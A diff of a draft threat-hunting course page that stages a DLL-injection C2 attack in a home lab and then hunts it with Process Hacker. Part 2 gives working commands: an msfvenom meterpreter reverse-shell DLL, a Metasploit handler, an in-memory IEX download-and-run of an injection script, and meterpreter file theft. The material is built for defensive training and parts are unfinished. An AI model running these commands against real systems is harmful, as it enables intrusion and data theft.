@@ -96,7 +96,12 @@
 
 		<section class="body">
 			<hr>
+<p><a href="">FOR THE VIDEO VERSION OF THIS COURSE CLICK HERE</a></p>
 <h1 id="introduction">Introduction</h1>
+<p>Hellom friend, so glad you could make it!</p>
+<figure class="custom-figure"><img src="/img/poe.gif"/>
+</figure>
+
 <p>In this course we&rsquo;ll learn how to threat hunt both classical and reflective DLL-injected C2 implants. We&rsquo;ll do so from 3 approaches: memory forensics, log analysis + UEBA, and traffic analysis. The entire course is practically-oriented, meaning that we&rsquo;ll learn by doing. I&rsquo;ll sprinkle in a tiny bit of theory just so we are on the same page re: C2 frameworks and DLL-injection attacks; and in case you wanted to dig in deeper I provide extensive references throughout this document.</p>
 <p>In case you&rsquo;re new and a little trepidated&hellip;
 I&rsquo;m literally going to hold your hand from point A to Z so even if you are a beginner and most of this seems foreign <strong>fret not</strong>! WRITE SOMETHING and add a GIF</p>
@@ -116,8 +121,11 @@ I&rsquo;m literally going to hold your hand from point A to Z so even if you are
 </ul>
 <p>.</p>
 <ul>
-<li>In PART 3 we&rsquo;ll cover memory forensics,</li>
+<li>In PART 3 we&rsquo;ll cover livememory forensics,</li>
 <li>first we&rsquo;ll do a basic live read using Process Hacker,</li>
+</ul>
+<p>IN PART 4 we do post-mortem analysis</p>
+<ul>
 <li>we&rsquo;ll then dump the memory with winpmem,</li>
 <li>finally we&rsquo;ll have a look at the it with Volatility.</li>
 </ul>
@@ -134,6 +142,7 @@ I&rsquo;m literally going to hold your hand from point A to Z so even if you are
 <li>we&rsquo;ll run our PCAPS through Zeek,</li>
 <li>and get some insights from the threat hunting framework RITA.</li>
 </ul>
+<p>IN final art put everything together and write a report./</p>
 <p>In the end we&rsquo;ll recap and formulate some key takeaways to serve you on your journey as you venture forth into the world and become a bada$$ hunter.</p>
 <p>But first, <em>le sigh</em>, it&rsquo;s required we just dip our toes into a wee bit of theory. But I promise once we&rsquo;re done here - 10 to 15 mins tops - it&rsquo;ll be applied learning until the end of our journey.</p>
 <p>Sounds good? Let&rsquo;s get it.</p>
@@ -598,7 +607,7 @@ You can download <a href="https://processhacker.sourceforge.io/downloads.php">Pr
 <figure class="custom-figure"><img src="/img/image029.png"/>
 </figure>
 
-<p>OK, that&rsquo;s it and now we&rsquo;ll just install RITA, Zeek, and Volatility and then the fun can finally begin!</p>
+<p>OK, that&rsquo;s it and now we&rsquo;ll just install RITA, Zeek, Volatility, DeepBlueCLIv3 and then the fun can finally begin!</p>
 <h1 id="rita--zeek">RITA + Zeek</h1>
 <p>Here&rsquo;s the cool thing about RITA: it will automatically install Zeek (and MariaDB btw) when you install it. Even better, it actually makes alterations to the standard Zeek config which will serve us even better - I&rsquo;ll discuss the exact details of this and why it&rsquo;s important when we get to that section in our course. For now let&rsquo;s get to installing.</p>
 <ol>
@@ -610,16 +619,64 @@ You can download <a href="https://processhacker.sourceforge.io/downloads.php">Pr
 </figure>
 
 <h1 id="volatility">Volatility</h1>
+<p>CHANGE THIS SIMPLY RUN THIS
+git clone <a href="https://github.com/volatilityfoundation/volatility3.git">https://github.com/volatilityfoundation/volatility3.git</a></p>
+<p>sudo apt install python3-pip</p>
+<p>pip3 install -r requirements.txt</p>
 <ol>
 <li>Once again we&rsquo;ll visit the <a href="https://github.com/volatilityfoundation/volatility3">program&rsquo;s Github repo.</a></li>
 <li>There is no real installation here, we&rsquo;ll simply git clone the repo, and then we&rsquo;ll run Volatility from that local directory whenever we use it.</li>
 </ol>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo git clone https://github.com/volatilityfoundation/volatility3.git
+</span></span></code></pre></div><p>now install python2
+Yes, you can install Python 2 and Python 3 side by side on Ubuntu without them interfering with each other. They are designed to coexist. You can use Python 3 with the python3 command and Python 2 with the python command.</p>
+<p>If Python 2 is not already installed on your Ubuntu system, you can install it using the following command:</p>
+<p>bash
+Copy code
+sudo apt update
+sudo apt install python2</p>
+<h1 id="deepbluecli">DeepBlueCLI</h1>
+<p>To run DeepBlueCLI we&rsquo;ll need PowerShell. And the good news of course is that PowerShell core is now cross-platform, so we can go ahead and install it on our analyst machine.</p>
+<ol>
+<li>Open your terminal.</li>
+<li>First update your list of packages</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt update
 </span></span></code></pre></div><ol start="3">
+<li>Next, install the prerequisite packages. Microsoft provides a package for easy installation.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt install -y wget apt-transport-https software-properties-common
+</span></span></code></pre></div><ol start="4">
+<li>Now you will need to download and add Microsoft&rsquo;s GPG key which is used to sign their packages.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wget -q https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb
+</span></span><span style="display:flex;"><span>sudo dpkg -i packages-microsoft-prod.deb
+</span></span></code></pre></div><ol start="5">
+<li>We can now install PowerShell.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt update
+</span></span><span style="display:flex;"><span>sudo apt install -y powershell
+</span></span></code></pre></div><ol start="6">
+<li>You can now switch from <strong>bash</strong> to  <strong>PowerShell</strong> at anytime in your terminal by running <code>pwsh</code>, if you want to switch back run <code>bash</code>.</li>
+</ol>
+<figure class="custom-figure"><img src="/img/image065.png"/>
+</figure>
+
+<p>Great now all that&rsquo;s left to do is install DeepBlueCLI.</p>
+<ol>
+<li>Staying in the terminal, in <code>bash</code>, let&rsquo;s navigate to the <code>/Desktop</code>.</li>
+<li>Run the following command</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>git clone https://github.com/sans-blue-team/DeepBlueCLI.git
+</span></span></code></pre></div><p>That&rsquo;s literally it.</p>
+<figure class="custom-figure"><img src="/img/easy.gif"/>
+</figure>
+
+<ol start="3">
 <li>Shut down your Ubuntu VM, we won&rsquo;t be using it for some time.</li>
 </ol>
 <p>Aaaaaaaalright! We are good to get rolling with our Attack. YEAH. There is however one more optional step, this is not required but will decrease network noise meaning when we do our log analysis we&rsquo;ll have a tidier dataset. I recommend doing it, it&rsquo;ll take about 30 seconds.</p>
-<p>For the Kali and Windows VMs repeat both these steps:</p>
+<p>For the Windows VMs only:</p>
 <ol>
 <li>Right-click on the VM in the library and select <code>Settings</code>.</li>
 <li>Go to <code>Network Adapter</code>, change to <code>Host-only</code>, hit <code>OK</code>.</li>
@@ -627,15 +684,450 @@ You can download <a href="https://processhacker.sourceforge.io/downloads.php">Pr
 <figure class="custom-figure"><img src="/img/image031.png"/>
 </figure>
 
-<p>That&rsquo;s it. And just so you are aware - we took these VMs ability to connect to the internet away, but they can still connect to one another on the local network.</p>
+<p>That&rsquo;s it. And just so you are aware - we took this VMs ability to connect to the internet away, but it can still connect to our hacker VM on the local network.</p>
 <p>OK. Do you know what time it is? Yeah it&rsquo;s time for all this installing and configuring to pay off - and we kick things off by emulating the attacker! Let&rsquo;s get it!</p>
 <figure class="custom-figure"><img src="/img/strangelove.gif"/>
 </figure>
 
 <hr>
-<h1 id="part-2-attack-time--live-analysis">PART 2: ATTACK TIME + LIVE ANALYSIS</h1>
-<p>We&rsquo;ll do the two different type of attacks - standard vs. reflective loaded - seperately. First we&rsquo;ll do the classical injection + its live analysis. Then we&rsquo;ll follow that by performing the reflective loading DLL injection attack + live analysis.</p>
-<p>Remmeber once all three are installed change Network adapter to host only.</p>
+<h1 id="part-2-attack-time">PART 2: ATTACK TIME</h1>
+<p>Preamble:</p>
+<ol>
+<li>First things first - fire up both VMs.</li>
+<li>On our kali VM - open a terminal and run <code>ip a</code> so we can see what the ip address is. Write this down, we&rsquo;ll be using it a few times during the generation of our stager and handler. You can see mine below is **192.168.230.155 **NOTE: Yours will be different!</li>
+</ol>
+<figure class="custom-figure"><img src="/img/image032.png"/>
+</figure>
+
+<ol start="3">
+<li>Now go to the Windows VM. Open an administrative PowerShell terminal. Run <code>ipconfig</code> so we also have the ip of the victim - write this down.</li>
+</ol>
+<figure class="custom-figure"><img src="/img/image033.png"/>
+</figure>
+
+<ol start="4">
+<li>And now, though it&rsquo;s not really required, I just like to ping the Kali VM from this same terminal just to make sure the two VMs are connecting to one another on the local network. Obviously if this fails you will have to go back and troubleshoot.</li>
+</ol>
+<figure class="custom-figure"><img src="/img/image034.png"/>
+</figure>
+
+<ol start="5">
+<li>Next we&rsquo;ll just create a simple text file on the desktop which will basically emulate the &ldquo;nuclear codes&rdquo; the threat actor is after. Right-click on the dekstop, <code>New</code> &gt; <code>Text document</code>, give it a name and add some generic content.</li>
+</ol>
+<figure class="custom-figure"><img src="/img/image035.png"/>
+</figure>
+
+<ol start="6">
+<li>And the final step before we get going is starting a Wireshark pcap recording. In the search bar write <code>WireShark</code> and open it. Under <code>Capture</code> you will see the available interfaces, in my case the one we want is called <code>Ethernet0</code> - yours may or may not have the same name. How do you know which is the correct one? Look at the little graphs next to the names only one should have little spikes representing actual network traffic, the rest are likely all flat. It&rsquo;s the active one, ie the one with traffic, we want - see image below. Once you&rsquo;ve identified it, simply double-click on it, this then starts the recording.</li>
+</ol>
+<figure class="custom-figure"><img src="/img/image036.png"/>
+</figure>
+
+<p>Great now that everything is setup let&rsquo;s generate our stager and transfer it over to the victim.</p>
+<ol>
+<li>On our Kali VM open your terminal.</li>
+<li>We are going to run the command below, which will generate a payload for us using <code>msfvenom</code> (a standalone app that is part of the Metasploit framework). Note the following:</li>
+</ol>
+<ul>
+<li><code>Lhost</code> is the IP of the <strong>listening</strong> machine, ie the attacker. Yours will be different than mine here, adapt it!</li>
+<li><code>Lport</code> is the port we will be listening on. This could be anything really, you can see in this case I chose an arbitraty port 88. You should be aware however that some victim systems may have strict rules regarding which outbound ports are allowed to be used, in these cases a standard port such as 80/443 would be a safer choice. Feel free to experiment/choose any port you&rsquo;d like\</li>
+<li><code>-f</code> designates the file type, which of course is DLL in this case.</li>
+<li><code>&gt;</code> indicates where we wish to save it, as well as the name we are giving to it, you can see I am saving it on my desktop as <code>evil.dll</code> - very subtle!</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.230.155 Lport=88 -f dll &gt; /home/hacker/Desktop/evil.dll
+</span></span></code></pre></div><figure class="custom-figure"><img src="/img/image037.png"/>
+</figure>
+
+<ol start="3">
+<li>Next we want to tranfer our malicious DLL over to the victim. There are a myriad ways in which you can achieve this, so feel free to follow my example, or use any other technique you prefer. Still on our Kali VM navigate to the directory where you saved your payload, in my case this is on the desktop. We&rsquo;ll now create a very simply http server by running a single python command (see below). Again <code>8008</code> represents an arbitrary port, feel free to choose something else</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 -m http.server 8008
+</span></span></code></pre></div><figure class="custom-figure"><img src="/img/image038.png"/>
+</figure>
+
+<ol start="4">
+<li>Now we&rsquo;ll head over to the victim&rsquo;s system, we can either run a powershell command to download the file, or very simply open the browser (Edge) and type in the address bar write <code>http://[IP of hacker]:[port of http server]</code>, for example:</li>
+</ol>
+<figure class="custom-figure"><img src="/img/image039.png"/>
+</figure>
+
+<ol start="5">
+<li>As you can see in the image above, you should see the dll file. If you don&rsquo;t, you either did not generate it, OR most likely you are not running the http server from the same directory. Now simply right-click on the DLL, <code>Save link as</code>, and in my case I will save it to desktop. Note that Edge may block the download, for example:</li>
+</ol>
+<figure class="custom-figure"><img src="/img/image040.png"/>
+</figure>
+
+<p>If this is the case, click on the three dots <code>...</code> to the right of this message (More actions), and select <code>Keep</code>. You&rsquo;ll be confronted with another warning, select <code>Show more</code>, then <code>Keep anyway</code>. That should have finally done the trick!</p>
+<figure class="custom-figure"><img src="/img/image042.png"/>
+</figure>
+
+<p>Ok, we now have our malicious DLL on the victim&rsquo;s disk.</p>
+<ol start="6">
+<li>So as we shared in the theory section of this course, this initial stager does one thing (at least on main thing): it calls back to the attacking machine to establish a connection and put in motion the subsequent series of events. But we can&rsquo;t run it just yet since we need something on our attacking machine that is actually listening and awaiting that call, ie the handler. So let&rsquo;s head over to our Kali VM, and in the terminal we&rsquo;ll run the following commands:</li>
+</ol>
+<ul>
+<li><code>msfconsole</code>: this will open our metasploit console.</li>
+<li><code> use exploit/multi/handler</code>: this sets up a generic payload handler inside the Metasploit framework. The <code>multi</code> in the command denotes that this is a handler that can be used with any exploit module, as it is not specific to any particular exploit or target system. The <code>handler</code> part of the command tells Metasploit to wait for incoming connections from payloads. Once the exploit is executed on the target system, the payload will create a connection back to the handler which is waiting for the incoming connection.</li>
+<li><code>set payload windows/meterpreter/reverse_tcp</code>:  tells Metasploit what payload to use in conjunction with the previously selected exploit. The payload is the code that will be executed on the target system after a successful exploit. <code>windows</code>: This tells the framework that the target system is running Windows. <code>meterpreter</code>: Meterpreter is a sophisticated payload that provides an environment for controlling, manipulating, and navigating the target machine. <code>reverse_tcp</code>: This creates a reverse TCP connection from the target system back to the attacker&rsquo;s system. When the payload is executed on the target system, it will initiate a TCP connection back to the attacker’s machine (where Metasploit is running).</li>
+</ul>
+<figure class="custom-figure"><img src="/img/image043.png"/>
+</figure>
+
+<ol start="7">
+<li>We now need to set required parameters, to see which ones are required run <code>show options</code>.</li>
+</ol>
+<figure class="custom-figure"><img src="/img/image044.png"/>
+</figure>
+
+<p>We can see there are 3 required parameters. The first one <code>EXITFUNC</code> is good as is. Meaning we need only to provide values for <code>LHOST</code> and <code>LPORT</code>, which is the exact same value we provided when we generated our <code>msfvenom</code> stager in step 2 - ie the attacker IP, as well as the port we chose (<strong>88</strong>).</p>
+<ol start="8">
+<li>We can now set these values with two commands:</li>
+</ol>
+<ul>
+<li><code>set LHOST 192.168.230.155</code> (Note: change IP to YOURS)</li>
+<li><code>set LPORT 88</code></li>
+</ul>
+<figure class="custom-figure"><img src="/img/image045.png"/>
+</figure>
+
+<ol start="9">
+<li>Now to start the listener we can use one of two commands, there&rsquo;s literally no difference. You can either use <code>run</code>, or <code>exploit</code>.</li>
+</ol>
+<figure class="custom-figure"><img src="/img/image046.png"/>
+</figure>
+
+<p>So now that we have our handler listening for a callback we can go back to our Windows VM to run the code.</p>
+<p><strong>Performing the standard DLL-injection</strong></p>
+<p>Next we need to perform a bit of Macgyvering&hellip;</p>
+<figure class="custom-figure"><img src="/img/macgyver.gif"/>
+</figure>
+
+<p>Here&rsquo;s the thing - to perform the injection we need another script which will get an actual process to inject <code>evil.dll</code> into its memory space. By far the most common and effective script to perform this is called <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1"><code>Invoke-DllInjection.ps1</code>.</a></p>
+<p>Usually in order to run this next attack we&rsquo;ll use a PowerShell command to download the script <a href="https://github.com/PowerShellMafia/PowerSploit">directly from the original github repo</a> and inject it directly into memory. The unfortunate thing is that this incredible artifact has not been updated in a few years, and since it&rsquo;s also been archived it&rsquo;s unlikely it ever will.</p>
+<p>The code as it currently stands on the original repo is however broken, at least when I tried it (in multiple configurations). The good news though is I found a simple fix and have updated the script which is now being hosted on <a href="https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1">my github repo here</a>.</p>
+<p>And thus, just so you are aware, we are going to download and inject into memory the script from my personal Github repo but <strong>in no way whatsoever do I want to appear as taking any credit/ownership for it</strong>. The original link, as well as a reference to where I found the fix, can be found in the opening comments in the script itself, feel free to refer to them if you want.</p>
+<ol>
+<li>Back on our Windows VM we&rsquo;ll open an administrative PowerShell terminal - a reminder that in order to do so you have to right-click on PowerShell and select <code>Run as Administrator</code>.</li>
+</ol>
+<figure class="custom-figure"><img src="/img/image047.png"/>
+</figure>
+
+<ol start="2">
+<li>Now we&rsquo;ll run the following command, as mentioned before: it&rsquo;s going to download a script hosted on a webserver and then inject it directly into memory. This is a good example of what living off the land is all about - utilizing everyday components while not leaving any residue on the hard drive.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1&#39;)
+</span></span></code></pre></div><p>Note that after you run it there won&rsquo;t be any feedback/output. In case you did not know this is almost universally true: when it comes to PowerShell, not receiving any feedback/output almost always means the command ran succesfully. If there was an error, you&rsquo;ll get some red text telling you what went wrong.</p>
+<p>OK so let&rsquo;s just hold back for a second. At this point, if you have your wits about you, you might be calling shenanigans.</p>
+<figure class="custom-figure"><img src="/img/shenanigans.gif"/>
+</figure>
+
+<p>&ldquo;Wait&rdquo;, I hear you say, &ldquo;if the whole point of infecting the victim and getting C2 control established is so that we can run commands on it, isn&rsquo;t it cheating then to be running these commands ahead of that actually happening? We&rsquo;ve now both downloaded the DLL file and run another command to download a script from a webserver and inject it into memory and it&rsquo;s not like the victim is going to do that for us. So what gives?&rdquo;</p>
+<p>Well, here the simple answer - this is a threat hunting course. And so we are &ldquo;cheating&rdquo; in a sense with the goal of saving to save the time of crafting an actual spearphishing email, which if done correctly will do both the things we did here manually (ie download DLL and inject remotely-hosted script into memory). If you wanted a more realistic simulation of the Initial Compromise, well there are courses-a-plenty on it (I provide some links below), so please explore your intellecutal curiosites to your heart&rsquo;s complete content. But for now, we&rsquo;re streamling all the peripheral actions so we can focus on the heart of this course - threat hunting.</p>
+<p>Great so the script that will inject <code>evil.dll</code> into a process memory space is now in memory. But to be clear: though we&rsquo;ve injected that script into memory, but we&rsquo;ve not yet executed it. We&rsquo;re about to do so, but before that there&rsquo;s one thing we need. Remeber in the beginning when I explained about how dll-injections work I said that we basically &ldquo;trick&rdquo; a legit process into running code from a malicious DLL. So this script is what&rsquo;s going to be doing the trickery, we of course have our malicious DLL which we transferred over, so taht means we only need a legit process.</p>
+<p>Now it used to be the case that you could eaasily inject into any process, including native Windows processes like notepad and calculator. You&rsquo;ll notice if you do some older tutorials, they&rsquo;ll almopst always choose one of these two as the example. However, though there are potential workarounds, this has become more ciomplicated since Windows 10 - if you&rsquo;re curious to know why <a href="https://security.stackexchange.com/questions/197409/why-doesnt-dll-injection-works-on-windows-10-for-native-windows-binaries-e-g">see here.</a></p>
+<p>So as to not overcomplicate things, and because it&rsquo;s not really all that unrealistic to expect a non-native Windows executable to be running on a victim&rsquo;s system, I&rsquo;ll be running a portable executable called rufus.exe. It&rsquo;s a very small, simple program that creates bootable usb drives, but taht&rsquo;s irrelevant we just need some process. If you really wanted to run the same thing you can <a href="https://rufus.ie/en/">get it here</a>, otherwise feel free to run any other program as longs as its not a native Windows one.</p>
+<ol start="3">
+<li>So we will run <code>rufus.exe</code>. But since we&rsquo;ll need to pass its Process ID (PID) to the script as an argument, we just need to find that real quick. You can either run Task Manager from the gui, or here I&rsquo;ll be running <code>ps</code> in PowerShell. And we can see here the PID is 784.</li>
+</ol>
+<figure class="custom-figure"><img src="/img/image048.png"/>
+</figure>
+
+<ol start="4">
+<li>And now all the pieces are in place so we can run the actual command below. We can note that we provide it two things, first the PID of the legit process we want to inject into, and the path to the DLL we want to be injected. So run the command in the same administrative PowerShell terminal.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Invoke-DllInjection -ProcessID 784 -Dll C:\Users\User\Desktop\evil.dll
+</span></span></code></pre></div><figure class="custom-figure"><img src="/img/image049.png"/>
+</figure>
+
+<ol start="5">
+<li>We see some output, now to know if it worked let&rsquo;s head on back to our Kali VM. We can immediately see that we received the connection and are now in a <code>meterpreter</code> shell - success!</li>
+</ol>
+<figure class="custom-figure"><img src="/img/popped_shell.gif"/>
+</figure>
+
+<figure class="custom-figure"><img src="/img/image050.png"/>
+</figure>
+
+<ol start="6">
+<li>We can run a few commands if we&rsquo;d like, also we&rsquo;ll exfiltrate the &ldquo;nuclear launch codes&rdquo; we created in the beginning.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>download C:\\Users\\user\\Desktop\\top_seekrit.txt /home/hacker/Desktop/
+</span></span></code></pre></div><figure class="custom-figure"><img src="/img/image051.png"/>
+</figure>
+
+<p>Additionally, we can also drop into a <code>shell</code>.</p>
+<figure class="custom-figure"><img src="/img/image052.png"/>
+</figure>
+
+<p>So that&rsquo;s it for our attack! Let&rsquo;s stop our traffic packet capture:</p>
+<ol>
+<li>Open WireShark.</li>
+<li>Press the red STOP button.</li>
+<li>Save the file, in my case I will save it to desktop as <code>dllattack.pcap</code>.</li>
+</ol>
+<p>And while this connection is still going we&rsquo;ll jump right into live memory analysis. Ok so just so we don&rsquo;t end up just learning a bunch of &ldquo;arbitraty&rdquo; diagnostic properties to look out for we have to go on a brief side quest to gather some Theory Berries of Enhanced Insight that has the property of helping our party gain greater insight into what we should be looking for, and more importantly - why.</p>
+<hr>
+<h1 id="side-quest-the-theoretical-berries-of-c2-beacon-live-reading">SIDE QUEST: The theoretical berries of C2 beacon live reading</h1>
+<figure class="custom-figure"><img src="/img/quest02.gif"/>
+</figure>
+
+<p>So here we&rsquo;ll discuss a few things we&rsquo;ll be on the lookout for that can serve as red flags. BUT, it&rsquo;s very important to know that there are <strong>NO silver bullet</strong>. There are no hard and fast rules where if we see any of the following we can be 100% sure we&rsquo;re dealing with malware. After all, if we could codify the rule there would be no need for us as threat hunters to do it ourselves - it would be trivial to simply write a program that does it automatically for us.</p>
+<p>Thus we&rsquo;ll be on the lookout for a handful of distinct signals, but these are almost always guideposts that help us figure out what needs deeper investigation. Even if somethin shows ALL the signs we list below, this would rather simply mean that we will then run further tests. For example if we see a process bearing many of these traits and we&rsquo;re sufficeintly suspicious we&rsquo;d likely then have the SOC create a rule and scan the rest of the network. If we for example use <strong>Least Frequency Analysis</strong> and we see the process only occurs on one or two system - well yeah then it&rsquo;s time to get in touch with DFIR.</p>
+<p>Here&rsquo;s a quick overview of our list:</p>
+<ol>
+<li>Parent-Child relationships</li>
+<li>Signature - is it valid + who signed?</li>
+<li>Current directory</li>
+<li>Command-line arguments</li>
+<li>Thread Start Address</li>
+<li>Memory Permissions</li>
+<li>Memory Content</li>
+</ol>
+<p>Note that 1-4 are not unique to dll-injections, but malware in general. Conversely, 5-7 are characteristics we expect only to see related to dll-injections.</p>
+<p><strong>Parent-Child relationships</strong></p>
+<ul>
+<li>As we know there exists a tree-like relationship between processes in Windows, meaning an existing process (called the Parent), tpyically spawns other processes (called the Child).</li>
+</ul>
+<p>OK FINISH THIS LATER NOW UIT IS RUNNING SO LET&rsquo;S RUN THROUGH HERE</p>
+<p>Note: have to review Eric Conrad and Chad Tilbury to beef out the first few</p>
+<hr>
+<h1 id="part-3-live-memory-analysis">PART 3: Live Memory Analysis</h1>
+<p>Open Process Hacker as admin - ie right-click and select <code>Run as administrator</code>. Scroll down until you see <code>rufus.exe</code> (or whatever other legitimate process you chose to inject into). We can now look at our 7 signs.</p>
+<ol>
+<li>Parent-Child relationships</li>
+</ol>
+<figure class="custom-figure"><img src="/img/image053.png"/>
+</figure>
+
+<ul>
+<li>TBH even though I said there is no silver bullet, nothing that can lead to 100% certainty, this first sign is HIGHLY SUSPECT. Why?</li>
+<li>Well first off we can see <code>rufus</code>, and then that it itself spawned <code>rundll32.exe</code>.</li>
+<li>There&rsquo;s two things suspect about this.</li>
+<li>First, we know that <code>rundll32.exe</code> is legitimate Windows process used to launch DLLs. But, since we also know that <code>rufus</code> is used to create bootable USB drives we have to ask ourselves: why on earth would this need to run <code>rundll32.exe</code>? Logically it makes no sense, and if we Google for example <code>rufus.exe spawn rundll32.exe</code> and there are no clean hits, well it certainly raises suspicion.</li>
+<li>Further, <code>rundll32.exe</code> itself is often invovled in malware for a number of reasons - it can be used to execute malicious code concealed in a DLL, it can be used for persistence by associating itself with a DLL and a commonly-called function, and <code>rundll32.exe</code> can be misused to initiate or maintain communication with the C2 server.</li>
+<li>Further it is also very often associated with the most popular C2 framework for advanced groups - <code>Cobalt Strike</code>. Why? Simply because Raphael Mudge, the creator of the Cobalt Strike, decided to name the default dll spawned by <code>rundll32.exe</code>. Though this can be renamed in the Cobalt Strike config, it turns out, perhaps somewhat surprisingly; that most hackers don&rsquo;t do this. So more than 50% if Cobalt Strike is present on your system you&rsquo;d expect to see <code>rundll32.exe</code>.</li>
+<li>All this to say: it&rsquo;s sus to see <code>rufus</code> spawning <code>rundll32.exe</code>, the fact that it is itself <code>rundll32.exe</code> is even more sus, but HOLY SMOKES the most sketchy thing of all is what we see in the next relationship - <code>rundll32.exe</code> spawning <code>cmd.exe</code>.</li>
+<li>I just said before that <code>rundll32.exe</code> is typically used to launch DLLs. Thus there is <strong>very</strong> little reason for us to expect it to be spawning the Windows command line interpreter <code>cmd.exe</code>. Now it could be that some amateur developer wrote some janky code that does this as some workaround, but in honesty if you see this you should get ready to dig in deeper. So let&rsquo;s do that by double-clicking on <code>rundll32.exe</code> to bring up its properties.</li>
+</ul>
+<ol start="2">
+<li>Signature - is it valid + who signed?</li>
+</ol>
+<figure class="custom-figure"><img src="/img/image054.png"/>
+</figure>
+
+<ul>
+<li>We can see here that it has a valid signature signed by Microsoft, since of course they are the creators of rundll32.exe.</li>
+</ul>
+<ol start="3">
+<li>Current directory</li>
+</ol>
+<ul>
+<li>On the same image we can see the <strong>Current directory</strong>, that is the &ldquo;working directory&rdquo; of the process, which is the directory where the process was started from or where it is operating.</li>
+<li>We can see here that the Current directory is the Desktop since that&rsquo;s where it was initiated from.</li>
+<li>Now this could happen with legitimate scripts or applications that are using rundll32.exe to call a DLL function.</li>
+<li>However, seeing rundll32.exe being called from an unusual location like a user&rsquo;s desktop could be suspicious, particularly if it&rsquo;s coupled with other strange behavior.</li>
+</ul>
+<ol start="4">
+<li>Command-line arguments</li>
+</ol>
+<ul>
+<li>And again in reference to the same image once more we see that the <strong>Command-line</strong> is <code>rundll32.exe</code>.</li>
+<li>This is actually very unusual - the `rundll32.exe`` command is typically used to execute a function in a specific DLL file, and thus, you would normally see it accompanied by arguments specifying the DLL file and function it&rsquo;s supposed to execute.</li>
+<li>For example, a legitimate command might look something like this: <code>rundll32.exe shell32.dll,Control_RunDLL</code>.</li>
+<li>Thus it being &ldquo;nude&rdquo; can certainly be seen as another point for Team Suspect.</li>
+</ul>
+<ol start="5">
+<li>Thread Start Address</li>
+</ol>
+<ul>
+<li>In the top of the Properties window select <code>Threads</code>.
+<figure class="custom-figure"><img src="/img/image055.png"/>
+</figure>
+</li>
+<li>We can see under <code>Start address</code> that it is mapped, meaning it does exist on disk.</li>
+<li>So this just tells us that this is not a Reflectively Loaded DLL, since we would expect that to have an unknown address listed as <code>0x0</code>.</li>
+</ul>
+<ol start="6">
+<li>Memory Permissions</li>
+</ol>
+<ul>
+<li>In the top of the Properties window select <code>Memory</code>.</li>
+<li>Now click once on the <code>Protection</code> header to sort it.</li>
+<li>Scroll down until you see <code>RWX</code> permissions, that is of course if it exists.
+<figure class="custom-figure"><img src="/img/image056.png"/>
+</figure>
+</li>
+<li>And indeed we see the presence of two memory spaces with <strong>Read-Write-Execute</strong> permissions, which as we learned is always unusual/suspect.</li>
+</ul>
+<ol start="7">
+<li>Memory Content</li>
+</ol>
+<ul>
+<li>Finally let&rsquo;s double-click on the larger of the two (172 kB) since this typically represents the payload.
+<figure class="custom-figure"><img src="/img/image057.png"/>
+</figure>
+</li>
+<li>And immediately we can see two clear giveaways that we are dealing with a PE file: first we see the magic bytes (<code>MZ</code>), and we see the strings we associate with a PE Dos Stub - <code>This program cannot be run in DOS mode</code>.</li>
+<li>So once again it seems suspect.</li>
+</ul>
+<p>That&rsquo;s it for our live analysis: feel free to exit Process Hacker. Let&rsquo;s discuss our results before dumping the memory and moving on to our post-mortem analysis.</p>
+<p>ANALYSIS
+add a table here
+review results, conclusions we can come to, next steps etc.</p>
+<p><strong>Memory Dump</strong>
+One final thing before we kill the connection and start our post-mortem analysis: we need to dump the memory.</p>
+<ol>
+<li>Open a <code>Command Prompt</code> as administrator.</li>
+<li>Navigate to the directory where you saved <code>winpmem</code>.</li>
+<li>We&rsquo;ll run the following command, meaning it will dump the memory and save it as <code>memdump.raw</code> in our present directory</li>
+</ol>
